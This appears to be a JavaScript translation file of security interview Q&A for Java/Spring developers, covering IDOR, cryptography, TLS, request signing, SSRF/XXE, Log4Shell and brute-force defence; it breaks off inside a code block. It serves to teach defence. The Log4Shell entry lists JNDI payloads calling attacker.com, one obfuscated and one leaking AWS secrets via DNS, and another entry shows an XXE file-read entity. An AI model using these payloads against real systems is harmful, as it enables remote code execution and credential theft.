/*
 * English translation of js/data/q-security.js — task T189. Format: js/core/i18n.js (content overlay).
 * ids: security-008 security-009 security-010 security-011 security-012 security-013 security-014
 * Updated for security-013 and security-014 per task T540.
 */
App.i18n.content({
  'security-008': {
    q: `Broken Access Control / IDOR: per-object authorization checks in Spring (e.g. viewing someone else's account statements). How do you implement an effective ownership check?`,
    a: `**Summary:** **IDOR (Insecure Direct Object Reference)** happens when an API uses direct identifiers (e.g. {{/accounts/12345/transactions}}) without **verifying ownership**. Defense: **deny-by-default**, check permissions at the **service layer** (not the controller), use **{{@PreAuthorize}}** with a custom {{PermissionEvaluator}} or query with {{WHERE user_id = ?}}.

### IDOR in a real banking app
- API: {{GET /api/v1/accounts/12345/statements?month=2024-01}}
- The attacker swaps {{12345}} → {{12346}} → reads someone else's statements.
- Root cause: **only authentication is checked (logged in), not authorization (is this user allowed to see account 12345)**.

### How to implement the ownership check

### 1. Service layer — explicit check (recommended, clearest)
~~~java
@Service
@RequiredArgsConstructor
public class StatementService {
    private final AccountRepository accountRepo;
    private final StatementRepository stmtRepo;

    public Page<Statement> getStatements(Long accountId, YearMonth month, Pageable pageable) {
        Long currentUserId = SecurityUtil.getCurrentUserId();
        // OWNERSHIP CHECK — blocks IDOR
        if (!accountRepo.existsByIdAndUserId(accountId, currentUserId)) {
            throw new NotFoundException("ACCOUNT_NOT_FOUND", "Account does not exist or you have no access to it");
        }
        return stmtRepo.findByAccountIdAndMonth(accountId, month, pageable);
    }
}
~~~

### 2. {{@PreAuthorize}} with SpEL — declarative, used on the controller
~~~java
@RestController
@RequiredArgsConstructor
public class StatementController {
    private final StatementService service;

    @GetMapping("/accounts/{accountId}/statements")
    @PreAuthorize("@accountSecurity.canAccess(#accountId)")
    public Page<Statement> getStatements(@PathVariable Long accountId, @RequestParam YearMonth month, Pageable pageable) {
        return service.getStatements(accountId, month, pageable);
    }
}

@Component
@RequiredArgsConstructor
public class AccountSecurity {
    private final AccountRepository accountRepo;
    public boolean canAccess(Long accountId) {
        return accountRepo.existsByIdAndUserId(accountId, SecurityUtil.getCurrentUserId());
    }
}
~~~

### 3. Custom {{PermissionEvaluator}} — reusable, object-level
~~~java
@Component
@RequiredArgsConstructor
public class AccountPermissionEvaluator implements PermissionEvaluator {
    private final AccountRepository accountRepo;
    @Override
    public boolean hasPermission(Authentication auth, Object targetId, Object permission) {
        if (!(targetId instanceof Long accountId)) return false;
        return accountRepo.existsByIdAndUserId(accountId, getUserId(auth));
    }
    @Override public boolean hasPermission(Authentication auth, Serializable targetId, String targetType, Object permission) { return false; }
}

// Config (needs @EnableMethodSecurity on a @Configuration class)
@Bean
static MethodSecurityExpressionHandler methodSecurityExpressionHandler(PermissionEvaluator evaluator) {
    DefaultMethodSecurityExpressionHandler h = new DefaultMethodSecurityExpressionHandler();
    h.setPermissionEvaluator(evaluator);
    return h;
}

// Usage
@PreAuthorize("hasPermission(#accountId, 'ACCOUNT_READ')")
~~~

### Comparing the approaches
| Approach | Pros | Cons | When to use |
|---|---|---|---|
| Explicit in the service | Clear, easy to test, debug, transactional | Repeated code across services | **Default** for business logic |
| {{@PreAuthorize}} SpEL | Concise, right at the controller | Hard to unit test, SpEL slower | Simple APIs with little logic |
| {{PermissionEvaluator}} | Reusable, centralized policy | More elaborate setup | Large systems, many resource types |

### Common pitfalls
- The check lives in the **controller**, but the service is public → internal calls bypass the check. {{@PreAuthorize}} runs through a proxy, so self-invocation (a method calling another method in the same bean) skips the check too.
- Using {{@PreAuthorize("principal.id == #account.userId")}} while {{#account}} is not loaded → NPE or an N+1 query.
- **Collection resources**: {{GET /accounts}} — you must filter with {{WHERE user_id = ?}}, not fetch everything and filter in Java.
- **Admin/Staff**: needs its own role check ({{hasRole('ADMIN') || @accountSecurity.canAccess(...)}}).

> Senior tip: **always check ownership at the service layer** — it is the "single source of truth" for authorization. {{@PreAuthorize}} is layer 2 (defense-in-depth). For banking: log every denied access (even though you return 404 to avoid revealing that the account exists), with {{accountId}}, {{userId}}, {{ip}} to detect enumeration attacks. Use {{existsByIdAndUserId}} (composite index) — fast, no entity loaded.`,
    follow: [
      `Why is the check at the service layer better than the controller? Internal call scenario?`,
      `How do Spring Security {{@PostAuthorize}} vs {{@PreAuthorize}} differ for collection filtering?`,
      `How do you implement "delegated access" (a support agent viewing a customer's account with permission) with a full audit trail?`
    ]
  },
  'security-009': {
    q: `Cryptography basics for developers: hashing vs encryption vs encoding — how do they differ? AES-GCM, RSA — when to use which? How should keys be managed?`,
    a: `**Summary:** **Encoding** (Base64, URL encoding) — a format conversion, **not security**, anyone can decode it. **Hashing** (bcrypt, SHA-256, Argon2) — one-way, irreversible, used for passwords and integrity checks. **Encryption** (AES-GCM, RSA) — two-way, decryptable with the key, used for data you need to read back (card numbers, PII). **AES-GCM** for symmetric encryption (data at rest, large data). **RSA** for asymmetric (key exchange, digital signature, small data). Key management: **Vault/KMS/HSM**, rotation, versioning, separation of duties.

### Hashing vs Encryption vs Encoding
| Type | Purpose | Reversible? | Key? | Example |
|---|---|---|---|---|
| **Encoding** | Format conversion | Yes (public algorithm) | No | Base64, URL encode, hex |
| **Hashing** | Integrity, password storage | **No** (one-way) | No (or a salt) | bcrypt, Argon2, SHA-256 |
| **Encryption** | Confidentiality | Yes (with the key) | Yes | AES-GCM, RSA, ChaCha20-Poly1305 |

### Symmetric vs Asymmetric Encryption
- **Symmetric (AES-GCM)**: the same key encrypts and decrypts. Fast, fits large data (files, DB columns, messages). Needs a secure key exchange.
- **Asymmetric (RSA, ECC)**: a key pair (public/private). Slow, only encrypts small data (< key size). Used for: key exchange (hybrid encryption), digital signatures, JWT signing.

### AES-GCM — the standard for symmetric encryption
- **Authenticated Encryption**: encryption + integrity (MAC) in a single pass.
- 256-bit key, 12-byte (96-bit) IV/nonce **unique every time**; never reuse a nonce with the same key (reuse → exposes the XOR of plaintexts and lets the attacker forge the tag).
- With random nonces, NIST SP 800-38D caps about 2^32 encryptions per key → high-volume systems must rotate keys (or use counter-style nonces).
- A 128-bit tag (16 bytes) is appended to the ciphertext.

~~~java
// Encrypt
public String encrypt(String plain, SecretKey key) throws GeneralSecurityException {
    byte[] iv = new byte[12]; RNG.nextBytes(iv); // RNG: static final SecureRandom
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv));
    byte[] ct = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
    // Storage format: iv (12) || ciphertext || tag (16) — doFinal already appends the tag to ct
    return Base64.getEncoder().encodeToString(ByteBuffer.allocate(iv.length + ct.length).put(iv).put(ct).array());
}

// Decrypt — wrong tag (tampered data) → AEADBadTagException
public String decrypt(String encoded, SecretKey key) throws GeneralSecurityException {
    byte[] data = Base64.getDecoder().decode(encoded);
    ByteBuffer bb = ByteBuffer.wrap(data);
    byte[] iv = new byte[12]; bb.get(iv);
    byte[] ct = new byte[bb.remaining()]; bb.get(ct);
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(128, iv));
    return new String(c.doFinal(ct), StandardCharsets.UTF_8);
}
~~~

### RSA — asymmetric encryption
- Only encrypts data **smaller than the key size** (RSA-2048: at most 190 bytes with OAEP-SHA256, 214 bytes with OAEP-SHA1, 245 bytes with PKCS#1 v1.5 — the last one should not be used).
- In practice: **hybrid encryption** — a random AES key encrypts the data, RSA encrypts the AES key.
- Used for: key exchange, digital signatures, JWT (RS256), TLS handshake.

~~~java
// Hybrid encrypt: RSA-OAEP wraps the AES key
public String hybridEncrypt(String plain, PublicKey rsaPublic) throws GeneralSecurityException {
    // 1. Generate a random AES key
    KeyGenerator kg = KeyGenerator.getInstance("AES"); kg.init(256);
    SecretKey aesKey = kg.generateKey();
    // 2. Encrypt the data with AES-GCM
    String encryptedData = encrypt(plain, aesKey);
    // 3. Wrap the AES key with RSA-OAEP
    // Note: SunJCE defaults to MGF1-SHA1 for this name — pass an explicit OAEPParameterSpec
    // to match the decrypting side (KMS/HSM/another library)
    Cipher rsa = Cipher.getInstance("RSA/ECB/OAEPWithSHA-256AndMGF1Padding");
    rsa.init(Cipher.WRAP_MODE, rsaPublic, new OAEPParameterSpec("SHA-256", "MGF1",
        MGF1ParameterSpec.SHA256, PSource.PSpecified.DEFAULT));
    byte[] wrappedKey = rsa.wrap(aesKey);
    // 4. Return wrappedKey + encryptedData (self-defined format)
    return Base64.getEncoder().encodeToString(wrappedKey) + "." + encryptedData;
}
~~~

### Key Management — just as important as the algorithm
- **Never hardcode keys** in code/config/git. Use **HashiCorp Vault**, **AWS KMS**, **Azure Key Vault**, **GCP KMS**, **HSM**.
- **Key rotation**: replace keys periodically per policy (e.g. yearly — AWS KMS automatic rotation defaults to 365 days) and per usage limits. Version keys ({{key-id}}, {{version}}). Decryption uses the matching key version, encryption always uses the latest.
- **Key hierarchy**: a Master key (KEK) encrypts the Data Encryption Key (DEK). The DEK encrypts data. Rotate the DEK often, the KEK rarely.
- **Separation of duties**: developers do not know the production key. CI/CD injects keys at runtime.
- **Audit log**: every key access is logged.

> Senior tip: **default to AES-GCM-256** for encrypting data at rest. **RSA-2048/3072 or ECC P-256** for asymmetric. **Never** implement crypto yourself — use {{javax.crypto}}, Bouncy Castle, Tink (Google). Key management with Vault/KMS is mandatory in production. For banking: FIPS 140-3 (or 140-2) Level 3 HSM for the master key, M-of-N key ceremonies for split knowledge.`,
    follow: [
      `Why does AES-GCM need a random IV every time? What happens if you reuse an IV + key?`,
      `RSA-OAEP vs RSA-PKCS1v1.5 — why is OAEP safer?`,
      `How do you rotate the encryption key for an already-encrypted DB column (envelope encryption)?`
    ]
  },
  'security-010': {
    q: `TLS and mTLS: how does the handshake work, certificate chains, keystore vs truststore in Java. When is mTLS mandatory?`,
    a: `**Summary:** the **TLS 1.3** (RFC 8446) handshake: ClientHello (cipher suites, key_share) → ServerHello + Certificate + CertificateVerify + Finished → Client Finished. **mTLS** adds client-certificate verification. The **keystore** holds your own private key + cert (identity). The **truststore** holds trusted CA certs used to verify the other side. mTLS is mandatory for service-to-service, zero-trust networks, regulatory compliance.

### TLS 1.3 Handshake (condensed)
1. **ClientHello**: {{cipher_suites}} (AES-GCM, ChaCha20-Poly1305), {{key_share}} (ECDHE public key), {{supported_groups}}, {{signature_algorithms}}.
2. **ServerHello**: picks the cipher, {{key_share}} (ECDHE public key) → compute the shared secret.
3. **EncryptedExtensions** (everything is encrypted from here on): ALPN, server_name, early_data (server accepting 0-RTT)…
4. **Certificate**: the server cert chain (leaf → intermediate → root).
5. **CertificateVerify**: a signature over the transcript hash using the private key.
6. **Finished**: HMAC(transcript, handshake_secret) — confirms the handshake integrity.
7. **Client Finished**: the same → application traffic keys ready.

**0-RTT** (early data): the client sends data right in flight 1 with a PSK from a previous session — replay attack risk; only for idempotent requests (the JDK's JSSE currently does not support 0-RTT; commonly seen at CDN/LB).

### mTLS (Mutual TLS)
- The server requires a client certificate: {{CertificateRequest}} in the handshake.
- The client sends {{Certificate}} + {{CertificateVerify}} (signature with the client's private key).
- The server verifies the client's cert chain against its truststore.
- Used for: **service-to-service** (zero-trust), a **bank's partner APIs**, **device authentication**.

### Keystore vs Truststore in Java
| | **Keystore** ({{-Djavax.net.ssl.keyStore}}) | **Truststore** ({{-Djavax.net.ssl.trustStore}}) |
|---|---|---|
| Contains | Your **own** private key + cert chain | **Trusted** CA certs (root/intermediate) |
| Purpose | Prove identity (server/client) | Verify the other side's cert |
| Format | PKCS12 (the keytool default since Java 9), JKS (legacy) | PKCS12, JKS (the JDK's {{cacerts}} is the default truststore) |
| Password | Required (protects the private key) | Can be absent (public certs only) |

~~~bash
# Create a PKCS12 keystore
keytool -genkeypair -alias server -keyalg RSA -keysize 2048 -keystore server.p12 -storetype PKCS12 -dname "CN=api.bank.com,O=Bank,C=VN"

# Import the CA cert into the truststore
keytool -importcert -alias rootca -file rootca.crt -keystore truststore.p12 -storetype PKCS12
~~~

~~~text
# Spring Boot application.properties (password pulled from a secret store, not hardcoded)
server.ssl.key-store=classpath:server.p12
server.ssl.key-store-password=changeit
server.ssl.key-store-type=PKCS12
server.ssl.trust-store=classpath:truststore.p12
server.ssl.trust-store-password=changeit
# mTLS: need = client cert mandatory, want = optional
server.ssl.client-auth=need
server.ssl.enabled-protocols=TLSv1.3,TLSv1.2
~~~
Spring Boot 3.1+ also has **SSL bundles** ({{spring.ssl.bundle.jks.*}} / {{spring.ssl.bundle.pem.*}}) shared by the server, RestClient/WebClient, and supporting cert reload when files change (3.2+).

### Certificate Chain
- Leaf cert (server) → Intermediate CA → Root CA (trusted).
- Client verification: signature chain + validity + revocation (OCSP/CRL) + hostname match (SAN).
- **Pinning**: the client hardcodes the expected cert/hash — used by mobile apps, high-value APIs. Risk: rotating the cert breaks the app.

### When is mTLS mandatory?
- **Service mesh** (Istio, Linkerd) — zero-trust network.
- **Open Banking / PSD2** — partner APIs require mTLS + signing.
- **Internal microservices** — defense-in-depth, prevents lateral movement.
- **IoT/Device** — the client cert is the identity, no passwords.

> Senior tip: **prefer TLS 1.3, accept TLS 1.2** with ECDHE + AEAD ciphers; TLS 1.0/1.1 have been disabled by default in the JDK (the security property {{jdk.tls.disabledAlgorithms}} in {{java.security}}). Public cert lifetimes are being shortened by the CA/B Forum (ballot SC-081: 200 days from 3/2026, heading towards 47 days in 2029) → automated renewal (ACME, cert-manager) is mandatory. Keep only the necessary CAs in the truststore — fewer = smaller attack surface. Spring Boot: {{server.ssl.client-auth=need}} for mTLS. Test the handshake: {{openssl s_client -connect api.bank.com:443 -servername api.bank.com -cert client.crt -key client.key}}.`,
    follow: [
      `What are the risks of TLS 1.3 0-RTT? When can it be allowed?`,
      `Keystore PKCS12 vs JKS — why is PKCS12 the current standard?`,
      `What are Certificate Transparency (CT) logs? How do they help detect mis-issuance?`
    ]
  },
  'security-011': {
    q: `Request signing between a bank and its partners (HMAC/digital signature): anti-forgery, replay protection (timestamp + nonce), non-repudiation. How to implement and verify?`,
    a: `**Summary:** **HMAC** (symmetric) uses a shared secret, fast, fits high-throughput internal APIs. **RSA/ECDSA digital signatures** (asymmetric) sign with the private key, verify with the public key — providing **non-repudiation**, mandatory for banking/partner transactions. Both need **timestamp + nonce** to stop replays. HMAC: {{HMAC-SHA256(key, method + path + timestamp + nonce + body)}}. Digital signature: {{RSA-PSS/SHA256(privateKey, payload + timestamp + nonce)}}.

### HMAC (Symmetric) — Internal high-throughput
- A shared secret between both sides. Key length ≥ 256-bit.
- Payload canonicalization: sort fields, concat with a delimiter, or deterministic JSON. Sign the HTTP method + path + query (and hash the body) as well, not only the body — so an attacker cannot reuse a valid signature on a different endpoint.
- Headers: {{X-Timestamp}}, {{X-Nonce}}, {{X-Signature}} (Base64 HMAC).
- Verify: recompute the HMAC, compare in constant time, check the timestamp window (±5 min), check the nonce is unused (Redis set with TTL).

~~~java
// HMAC Sign
public byte[] sign(String payload, String timestamp, String nonce, SecretKey key) throws GeneralSecurityException {
    String data = payload + "|" + timestamp + "|" + nonce;
    Mac mac = Mac.getInstance("HmacSHA256");
    mac.init(key);
    return mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
}

// Verify
public boolean verify(String payload, String timestamp, String nonce, String signatureB64, SecretKey key) throws GeneralSecurityException {
    Duration skew = Duration.between(Instant.parse(timestamp), Instant.now()).abs();
    if (skew.toSeconds() > 300) return false; // blocks both past and future timestamps
    byte[] expected = sign(payload, timestamp, nonce, key);
    if (!MessageDigest.isEqual(expected, Base64.getDecoder().decode(signatureB64))) return false; // constant-time
    return nonceStore.addIfAbsent(clientId + ":" + nonce, Duration.ofSeconds(600)); // replay check only after the signature is valid
}
~~~

### Digital Signature (Asymmetric) — Non-repudiation, Partner/Banking
- Sender: the private key (RSA-PSS/ECDSA-P256) signs payload + timestamp + nonce.
- Receiver: the public key (X.509 cert) verifies.
- Non-repudiation: the sender cannot deny having signed, because only they hold the private key.
- Cert chain validation + revocation check (OCSP/CRL).

~~~java
// RSASSA-PSS in the JDK requires setting parameters (hash, MGF1, salt length)
static final PSSParameterSpec PSS = new PSSParameterSpec("SHA-256", "MGF1", MGF1ParameterSpec.SHA256, 32, 1);

// Sign with RSA-PSS
public String sign(String payload, String timestamp, String nonce, PrivateKey privateKey) throws GeneralSecurityException {
    String data = payload + "|" + timestamp + "|" + nonce;
    Signature sig = Signature.getInstance("RSASSA-PSS");
    sig.setParameter(PSS);
    sig.initSign(privateKey);
    sig.update(data.getBytes(StandardCharsets.UTF_8));
    return Base64.getEncoder().encodeToString(sig.sign());
}

// Verify with Public Key from Cert
public boolean verify(String payload, String timestamp, String nonce, String signature, PublicKey publicKey) throws GeneralSecurityException {
    if (Duration.between(Instant.parse(timestamp), Instant.now()).abs().toSeconds() > 300) return false;
    Signature sig = Signature.getInstance("RSASSA-PSS");
    sig.setParameter(PSS);
    sig.initVerify(publicKey);
    sig.update((payload + "|" + timestamp + "|" + nonce).getBytes(StandardCharsets.UTF_8));
    if (!sig.verify(Base64.getDecoder().decode(signature))) return false;
    return nonceStore.addIfAbsent(partnerId + ":" + nonce, Duration.ofSeconds(600));
}
~~~

### Anti-Replay — Timestamp + Nonce
| Mechanism | Description |
|---|---|
| **Timestamp** | The client sends {{X-Timestamp}} (ISO-8601 UTC). The server rejects if the difference exceeds 5 minutes. NTP sync is required. |
| **Nonce** | 16-32 random bytes per request. The server stores in Redis ({{SET key NX EX ttl}}, key = clientId + nonce) with TTL ≥ the timestamp window width (both sides). Reject if it already exists. |
| **Combined** | Combine both: the timestamp bounds the window, the nonce blocks duplicates within the window. |

### HMAC vs Digital Signature
| Criterion | HMAC (SHA256) | Digital Signature (RSA-PSS/ECDSA) |
|---|---|---|
| Key | Shared secret (symmetric) | Key pair (asymmetric) |
| Non-repudiation | **No** (both sides hold the secret) | **Yes** (only the signer has the private key) |
| Performance | Very fast | Slower (especially the RSA signing step; ECDSA/Ed25519 sign faster than RSA) |
| Key distribution | Hard (needs a secure channel) | Easy (the public key is public) |
| Use case | Internal microservices, high QPS | Partner APIs, banking transactions, audit trails |

> Senior tip: **banks usually require digital signatures** for transfers and account opening — non-repudiation is often a legal/contractual requirement with partners. Internal services use HMAC for performance. Always canonicalize the payload (sorted keys, no whitespace) before signing. Key rotation: rotate the HMAC secret every 90 days, signing certs every 1-2 years. Log every failed verification (potential attack).`,
    follow: [
      `HMAC vs Digital Signature: when to use which for an open banking API?`,
      `How to canonicalize a JSON payload deterministically (key order, whitespace)?`,
      `How do you handle clock skew between client/server when verifying timestamps?`
    ]
  },
  'security-012': {
    q: `SSRF, XXE and insecure deserialization in Java: configuring a safe XML parser, blocking internal URL requests. What are the real-world attack vectors?`,
    a: `**Summary:** **SSRF** (Server-Side Request Forgery): the attacker makes the server fetch an internal URL (cloud metadata, localhost, private IPs). **XXE** (XML External Entity): the XML parser resolves external entities → file read, SSRF, DoS. **Insecure Deserialization**: Java deserializing untrusted data → gadget chains → RCE. Defense: whitelist outbound traffic, disable external entities, disable deserialization or use ObjectInputFilter.

### SSRF (Server-Side Request Forgery)
- Vector: an API fetches a URL from user input (webhooks, avatar URLs, document import, PDF generators).
- Targets: {{http://169.254.169.254}} (AWS metadata), {{http://localhost:8080}}, {{http://127.0.0.1}}, private IP ranges, internal services.
- Impact: credential theft (IAM role), internal service enumeration, RCE via an internal admin panel.

~~~java
// ❌ DANGEROUS
public String fetchUrl(String url) {
    return new RestTemplate().getForObject(url, String.class);
}

// ✅ SAFER — host allowlist + block internal IPs for EVERY address DNS resolves to
private static final Set<String> ALLOWED_HOSTS = Set.of("partner.example.com");

public String fetchUrlSafe(String url) throws IOException {
    URI uri = URI.create(url);
    if (!"https".equals(uri.getScheme())) throw new SecurityException("HTTPS only");
    if (!ALLOWED_HOSTS.contains(uri.getHost())) throw new SecurityException("Host is not on the allowlist");
    for (InetAddress a : InetAddress.getAllByName(uri.getHost())) {
        if (a.isLoopbackAddress() || a.isSiteLocalAddress() || a.isLinkLocalAddress() // 169.254.x = metadata
                || a.isAnyLocalAddress() || a.isMulticastAddress()) {
            throw new SecurityException("Internal IP blocked: " + a);
        }
        // isSiteLocalAddress() does not cover IPv6 ULA fc00::/7, 100.64/10… — extra checks needed
    }
    // The client must: TURN OFF redirects, set a timeout, cap the response size,
    // and connect to exactly the IP it just checked (against DNS rebinding)
    return restClient.get().uri(uri).retrieve().body(String.class);
}
~~~
On AWS, enable **IMDSv2** (token PUT required, hop limit 1) so a simple GET-style SSRF cannot grab credentials from the metadata service.

### XXE (XML External Entity) — XML parsers
- Payload: {{<!ENTITY xxe SYSTEM "file:///etc/passwd">}} → local file read.
- Parameter entity + FTP/HTTP → SSRF.
- Billion laughs (entity expansion) → DoS.

~~~java
// ❌ DANGEROUS — the JDK's default config still processes DTDs and external entities
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
Document doc = dbf.newDocumentBuilder().parse(input);

// ✅ SAFE — forbid DOCTYPE (blocks both XXE and billion laughs)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// If DOCTYPE must be allowed, at minimum disable these features:
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
Document doc = dbf.newDocumentBuilder().parse(input);
~~~
Other parsers must be configured separately too: {{SAXParserFactory}}, {{XMLInputFactory}} (StAX: {{SUPPORT_DTD=false}}), {{TransformerFactory}}/{{SchemaFactory}} ({{XMLConstants.ACCESS_EXTERNAL_DTD}} = empty string), Jackson XML.

### Insecure Deserialization — Java Gadget Chain
- {{ObjectInputStream.readObject()}} on untrusted data → RCE (CommonsCollections, Spring, ROME gadgets).
- Deserialization happens **before** business-logic validation.
- Vectors: RMI, JMS, HTTP (session, viewstate), file upload, caches (Redis/Java serialization).

~~~java
// ✅ SAFE — ObjectInputFilter (JEP 290, Java 9+)
// Allowlist + resource limits, classes outside the list are rejected (!*)
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=10;maxrefs=10000;maxbytes=1048576;com.myapp.dto.*;java.lang.*;java.util.*;!*");
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filter);
// Or system-wide: -Djdk.serialFilter=... (same syntax)

// Jackson: do NOT enable default typing / @JsonTypeInfo(use = CLASS) for untrusted
// data — that is exactly the door for gadget chains. If polymorphic typing is mandatory:
PolymorphicTypeValidator ptv = BasicPolymorphicTypeValidator.builder()
    .allowIfSubType("com.myapp.dto.") // package allowlist
    .build();
mapper.activateDefaultTyping(ptv, ObjectMapper.DefaultTyping.NON_FINAL);
~~~

### Real-world pitfalls
- **PDF generators** (wkhtmltopdf, headless Chrome) render HTML from the user → SSRF via {{<img src="http://169.254.169.254">}}.
- **SAML/XML** parsing without disabling external entities → XXE.
- **Java serialization** in Redis sessions / RMI → deserialization RCE.
- **Log4Shell** (CVE-2021-44228) — at its core it is **JNDI injection**: a lookup inside a log message makes the app connect to the attacker's LDAP/RMI server and receive a malicious class/object → RCE.

> Senior tip: **deny all outbound by default** — only whitelist partner domains/IPs. Enforce the policy with an egress proxy (Envoy, Squid). XML parsers: set the {{disallow-doctype-decl=true}} feature right at init. Deserialization: {{ObjectInputFilter}} (JEP 290; Java 17 adds context-dependent filter factories — JEP 415), and ideally never deserialize native Java from untrusted sources. Log4Shell: upgrade Log4j 2.17.1+ (Java 8) — since 2.16.0 JNDI is disabled by default and message lookup was removed; {{log4j2.formatMsgNoLookups=true}} is only a stopgap and **not enough** (it was bypassed, CVE-2021-45046).`,
    follow: [
      `SSRF bypass via DNS rebinding / TOCTOU — how to defend?`,
      `How is blind XXE exploited through parameter entities?`,
      `What does the Java {{ObjectInputFilter}} pattern-matching syntax look like? Whitelist vs blacklist?`
    ]
  },
  'security-013': {
    q: `Library vulnerability (Log4Shell CVE-2021-44228): SCA, SBOM, emergency patching process in a bank. Root cause analysis and lessons learned?`,
    a: `**Summary:** **Log4Shell** (CVE-2021-44228, CVSS 10.0) — a JNDI lookup in Log4j 2.x when a log message contains a JNDI payload → RCE. Root cause: the **message lookup substitution** feature allows JNDI lookups without any restriction. Lessons: SCA (Software Composition Analysis) is mandatory in CI/CD, an SBOM (Software Bill of Materials) tells you the dependency tree, a 24-72h emergency patching process for critical CVEs, defense-in-depth (WAF, egress firewall, runtime protection).

### Root Cause Analysis
- Log4j 2.0-beta9 through 2.14.1: {{MessagePatternConverter}} processes
~~~text
\${prefix:name}
~~~
→ {{StrSubstitutor}} resolves it.
- The {{jndi:}} prefix triggers {{JndiLookup}} → {{JndiManager.lookup()}} → connects to the attacker's LDAP/RMI server → the server returns a Reference pointing at a remote class (old JDKs would load classes from the codebase URL) or a serialized object exploiting gadgets already present on the classpath → RCE.
- Even when RCE is not achievable, a lookup like {{env:}} nested inside {{jndi:ldap}} / DNS still **leaks secrets** (environment variables) outward.
- Any attacker-controllable data that gets logged (header, parameter, body, username) triggers it — even parameterized-style logging.

### Sample JNDI payloads
~~~text
\${jndi:ldap://attacker.com:1389/Exploit}
\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://attacker.com/x}   # obfuscated, evades WAF
\${jndi:ldap://\${env:AWS_SECRET_ACCESS_KEY}.attacker.com/a}                     # leaks secrets via DNS
# Trigger: log.info("User-Agent: " + userAgent);
# Even log.info("User-Agent: {}", userAgent) is affected (2.0-beta9 → 2.14.1)
~~~

### SCA (Software Composition Analysis) — early detection
- **Tools**: OWASP Dependency-Check, Snyk, Sonatype OSS Index, GitHub Dependabot, Trivy, Grype.
- **CI/CD integration**: fail the build when a critical/high CVE exists in a dependency (block merge).
- **Transitive dependencies**: SCA scans the whole dependency tree, not only direct ones.
- **Policy**: critical CVE → block deploy, 24h remediation; high → 72h.

### SBOM (Software Bill of Materials) — know what you have
- Formats: **SPDX** (Software Package Data Exchange), **CycloneDX** (OWASP).
- Contains: component name, version, supplier, hash, license, CVE mapping.
- Generate at build time: {{mvn cyclonedx:makeAggregateBom}}, {{syft dir:. -o cyclonedx-json}}.
- Usage: quick impact assessment when a new CVE appears (grep the SBOM for {{log4j-core}}).

### Emergency patching process in a bank (critical CVE)
| Phase | Time | Action |
|---|---|---|
| **Detect** | T+0 | SCA alert / CVE published / threat intel feed |
| **Triage** | T+1h | Security team confirms affected scope, assesses exploitability |
| **Contain** | T+2h | WAF rule blocking lookup strings containing {{jndi:}}, egress firewall blocking outbound LDAP/RMI; if the upgrade cannot land yet: remove the {{JndiLookup}} class from the {{log4j-core}} jar (the temporary measure recommended by Apache) |
| **Patch** | T+24h | Upgrade log4j-core 2.17.1+ (Java 8; 2.12.4 for Java 7, 2.3.2 for Java 6), rebuild, test, deploy canary |
| **Verify** | T+48h | Rescan, penetration test, confirm the fix |
| **Report** | T+72h | Report to CISO/Regulator, update the SBOM, lessons learned |

> Note on history: the initial workaround {{-Dlog4j2.formatMsgNoLookups=true}} (2.10+) was later proven **insufficient** (CVE-2021-45046 still exploited via Context Lookup in pattern layout). Only upgrading or removing {{JndiLookup.class}} is a reliable mitigation.

### Defense-in-depth (not only patching)
- **WAF**: a rule blocking lookup strings containing {{jndi:}} and nested lookup forms in headers/body — only a temporary layer, obfuscated payloads can slip through.
- **Egress firewall**: block outbound LDAP (389), RMI (1099), DNS to unknown resolvers.
- **Runtime protection**: Java agents (Contrast, Datadog) detect JNDI lookups.
- **Logging hygiene**: do not log raw user input, sanitize before logging.

> Senior tip: **Log4Shell is a wake-up call for supply chain security**. Make it an internal standard: an SBOM for every release, SCA gates in CI/CD, a patch SLA for critical CVEs (e.g. 24-72h), managed WAF rules that update automatically. Not just Log4j — the same applies to Spring4Shell (CVE-2022-22965), Jackson gadgets. The biggest lesson: **know right away which version runs where** (SBOM + inventory) and have a pipeline fast enough to rebuild/redeploy every service within hours.`,
    follow: [
      `How was the initial Log4j 2.15.0 fix bypassed (CVE-2021-45046)?`,
      `SBOM CycloneDX vs SPDX — which one for VN banking compliance?`,
      `How do you detect Log4Shell exploit attempts in production logs in real time?`
    ]
  },
  'security-014': {
    q: `Defending against login brute force: per-user/IP rate limiting, temporary lockout, CAPTCHA, credential stuffing detection. How to make it production-ready?`,
    a: `**Summary:** **Layered defense**: rate limiting per IP + per user (sliding window), progressive account lockout (exponential backoff), CAPTCHA after N failures, device fingerprinting + behavioral analysis for credential stuffing. Spring Boot: {{Bucket4j}} / {{Resilience4j}} rate limiter, Redis counters, checking leaked passwords with {{PwnedPasswords}}.

### Rate Limiting Strategy
| Layer | Scope | Algorithm | Example config |
|---|---|---|---|
| **Network/WAF** | IP | Token bucket | 100 req/min/IP, burst 20 |
| **Application** | IP + User | Sliding window | 50 req/15min/IP (corporate NAT / 4G share IP), 10 req/15min/user |
| **Login endpoint** | User | Fixed window + exponential backoff | 5 fails → lock 15m, 10 fails → lock 1h, 20 fails → lock 24h |

### Account Lockout — Exponential Backoff
- Fails 1-4: no lock, just rate limiting.
- Fail 5: lock 15 minutes.
- Fail 10: lock 1 hour.
- Fail 20: lock 24 hours, require an MFA reset via email/SMS.
- Unlock: automatically after the timeout, admin unlock, or user self-service via an email link.

~~~java
// Redis-based rate limiter + lockout
@Service
@RequiredArgsConstructor
public class LoginProtectionService {
    private final RedisTemplate<String, String> redis;
    private static final int MAX_ATTEMPTS = 5;
    // Counting window must be LONGER than lock duration (15 min), otherwise
    // counter resets after each lock and never escalates to 1h/24h locks
    private static final Duration COUNT_WINDOW = Duration.ofHours(24);

